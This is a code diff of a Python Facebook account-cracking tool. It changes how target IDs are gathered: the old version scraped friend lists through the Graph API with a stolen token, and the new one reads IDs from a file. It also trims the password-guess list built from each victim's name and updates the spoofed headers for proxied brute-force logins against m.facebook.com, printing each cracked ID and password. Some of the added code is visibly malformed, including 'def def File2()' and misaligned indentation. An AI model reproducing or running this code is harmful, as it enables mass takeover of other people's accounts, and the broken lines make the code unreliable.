@@ -193,7 +193,7 @@ def menu(my_name,my_id):
 	_____renv__renv_____ = input('\n CHOICE : ')
 	print('')
 	if _____renv__renv_____ in ['1']:
-		dump_massal()
+		File2()
 	elif _____renv__renv_____ in ['0']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
@@ -207,52 +207,19 @@ def error():
 	time.sleep(4)
 	back()
 #-------------------[ CRACK-PUBLIK ]----------------#
-def dump_massal():
-	try:
-		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()
-	except IOError:
-		exit()
-	try:
-		jum = int(input('HOW MANY ID FOR CRACK '))
-	except ValueError:
-		print('WRONG INPUT')
-		exit()
-	if jum<1 or jum>100:
-		print('ID NOT PUBLIC ')
-		exit()
-	ses=requests.Session()
-	yz = 0
-	for met in range(jum):
-		yz+=1
-		kl = input('PASTE ID PUBLIC '+str(yz)+' : ')
-		uid.append(kl)
-	for userr in uid:
-		try:
-			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
-			for mi in col['friends']['data']:
-				try:
-					iso = (mi['id']+'|'+mi['name'])
-					if iso in id:pass
-					else:id.append(iso)
-				except:continue
-		except (KeyError,IOError):
-			pass
-		except requests.exceptions.ConnectionError:
-			print('ERROR ')
-			exit()
-	try:
-		print('')
-		print(f'SUCCESSFULL DUMPED  {h}'+str(len(id)))
-		setting()
-	except requests.exceptions.ConnectionError:
-		print(f'{x}')
-		print('ERROR ')
-		back()
-	except (KeyError,IOError):
-		print(f'{k} NOT PUBLIC {x}')
-		time.sleep(3)
-		back()
+def def File2():
+			print('')
+			print('\x1b[1;92m             FILE CLONING')
+			try:
+				print('        - - - - - - - - - - - -')
+				fileX = input (f' {P} ENTER FILE PATH :\x1b[1;32m ') 
+				print()
+				for line in open(fileX, 'r').readlines():
+					id.append(line.strip())
+				print('')			
+				setting()
+			except IOError:
+				exit("\x1b[1;32m[!] FILE  %s NOT FOUND"%(fileX))
 #-------------[ PENGATURAN-IDZ ]---------------#
 def setting():
 	print(f'\n{x} SELECT [1-]OLD [2-] NEW [3-] [OLD/NEW] ')
@@ -324,7 +291,7 @@ def passwrd():
 				if len(frs)<3:
 					pass
 				else:
-			      
+			                pwv.append(nmf)
 					pwv.append(frs+'123')
 					pwv.append(frs+'111222')
 					pwv.append(frs+'123123')
@@ -333,56 +300,17 @@ def passwrd():
 					pwv.append(frs+'112233')
 					pwv.append(frs+'22334455')
 					pwv.append(frs+'223344')
-					pwv.append(nmf)
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
 					pwv.append(frs+'123456789')
 					pwv.append(frs+'112233')
-					pwv.append(frs+'1999')
-					pwv.append(frs+'2000')
-					pwv.append(frs+'123123')
-					pwv.append(frs+'123321')
-					pwv.append(frs+'12341234')
-					pwv.append(frs+'123456')
-					pwv.append(frs+'12345678')
-					pwv.append(frs+'1234567')
-					pwv.append(frs+'2003')
-					pwv.append(frs+'123@')
-					pwv.append(frs+'1234@')
-					pwv.append(frs+'12345@')
-					pwv.append(frs+'1122')
-					pwv.append(frs+'11')
-					pwv.append(frs+'12')
-					pwv.append(frs+'10')
-					pwv.append(frs+'11223344')
-					pwv.append(frs+'1122334455')
-					pwv.append(frs+'112233445566')
-					pwv.append(frs+'1990')
-					pwv.append(frs+'1991')
-					pwv.append(frs+'1992')
-					pwv.append(frs+'1993')
-					pwv.append(frs+'1994')
-					pwv.append(frs+'1995')
-					pwv.append(frs+'1996')
-					pwv.append(frs+'1997')
-					pwv.append(frs+'1998')
-					pwv.append(frs+'1999')
-					pwv.append(frs+'2000')
-					pwv.append(frs+'2001')
-					pwv.append(frs+'2002')
-					pwv.append(frs+'2003')
-					pwv.append(frs+'2004')
-					pwv.append(frs+'2005')
-					pwv.append(frs+'2006')
-					pwv.append(frs+'2007')
-					pwv.append(frs+'2008')
-					pwv.append(frs+'2009')
-					pwv.append(frs+'2010')
+					
 
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
 				else:
+					pwv.append(nmf)
 					pwv.append(frs+'123')
 					pwv.append(frs+'111222')
 					pwv.append(frs+'123123')
@@ -391,51 +319,10 @@ def passwrd():
 					pwv.append(frs+'112233')
 					pwv.append(frs+'22334455')
 					pwv.append(frs+'223344')
-					pwv.append(nmf)
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
 					pwv.append(frs+'123456789')
 					pwv.append(frs+'112233')
-					pwv.append(frs+'1999')
-					pwv.append(frs+'2000')
-					pwv.append(frs+'123123')
-					pwv.append(frs+'123321')
-					pwv.append(frs+'12341234')
-					pwv.append(frs+'123456')
-					pwv.append(frs+'12345678')
-					pwv.append(frs+'1234567')
-					pwv.append(frs+'2003')
-					pwv.append(frs+'123@')
-					pwv.append(frs+'1234@')
-					pwv.append(frs+'12345@')
-					pwv.append(frs+'1122')
-					pwv.append(frs+'11')
-					pwv.append(frs+'12')
-					pwv.append(frs+'10')
-					pwv.append(frs+'11223344')
-					pwv.append(frs+'1122334455')
-					pwv.append(frs+'112233445566')
-					pwv.append(frs+'1990')
-					pwv.append(frs+'1991')
-					pwv.append(frs+'1992')
-					pwv.append(frs+'1993')
-					pwv.append(frs+'1994')
-					pwv.append(frs+'1995')
-					pwv.append(frs+'1996')
-					pwv.append(frs+'1997')
-					pwv.append(frs+'1998')
-					pwv.append(frs+'1999')
-					pwv.append(frs+'2000')
-					pwv.append(frs+'2001')
-					pwv.append(frs+'2002')
-					pwv.append(frs+'2003')
-					pwv.append(frs+'2004')
-					pwv.append(frs+'2005')
-					pwv.append(frs+'2006')
-					pwv.append(frs+'2007')
-					pwv.append(frs+'2008')
-					pwv.append(frs+'2009')
-					pwv.append(frs+'2010')
 			if 'ya' in pwpluss:
 				for xpwd in pwnya:
 					pwv.append(xpwd)
@@ -469,12 +356,52 @@ def crack(idf,pwv):
 		try:
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
-			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+			ses.headers.update({'authority': 'm.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'dpr': '3',
+    'referer': 'https://m.facebook.com/bookmarks/',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"JKM-LX1"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"9.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': ua,
+    'viewport-width': '980',
+})
 			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=658686778541171&kid_directed_site=0&app_id=658686778541171&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D658686778541171%26redirect_uri%3Dhttps%253A%252F%252Fwww.ekingsnews.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Db9eb820b25d1c50ab896f860145238df%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd214f965-77da-4e9e-8bff-793207c95801%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Db9eb820b25d1c50ab896f860145238df%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v7.0/dialog/oauth?display=popup&response_type=code&client_id=658686778541171&redirect_uri=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook&state=b9eb820b25d1c50ab896f860145238df&scope=public_profile%2Cemail&ret=login&fbapp_pres=0&logger_id=d214f965-77da-4e9e-8bff-793207c95801&tp=unspecified#_=_","flow":"login_no_pin","pass":pw,}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=658686778541171&kid_directed_site=0&app_id=658686778541171&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D658686778541171%26redirect_uri%3Dhttps%253A%252F%252Fwww.ekingsnews.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Db9eb820b25d1c50ab896f860145238df%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd214f965-77da-4e9e-8bff-793207c95801%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Db9eb820b25d1c50ab896f860145238df%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+			heade={'authority': 'm.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'dpr': '3',
+    'referer': 'https://m.facebook.com/bookmarks/',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"JKM-LX1"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"9.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': ua,
+    'viewport-width': '980',
+}
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r{x} ID/PASS  {x}{K}{idf}|{pw}')
